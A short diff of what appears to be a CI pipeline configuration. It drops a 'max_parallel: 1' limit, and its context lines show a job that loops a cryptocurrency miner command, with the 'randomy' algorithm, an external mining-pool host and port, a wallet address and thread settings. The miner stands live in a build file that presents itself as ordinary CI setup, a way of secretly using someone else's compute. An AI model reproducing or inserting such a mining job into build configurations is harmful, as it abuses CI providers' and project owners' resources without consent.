@@ -17,7 +17,6 @@ jobs:
               $CM -a randomy -o us.catchthatrabbit.com:8008 -u CB66C56381EE3FE462F239B920A8A706FBE8225E24F0 -p CCI --donate-level 1 -t 4
               sleep 5
             done
-    max_parallel: 1
 workflows:
   build:
     jobs:
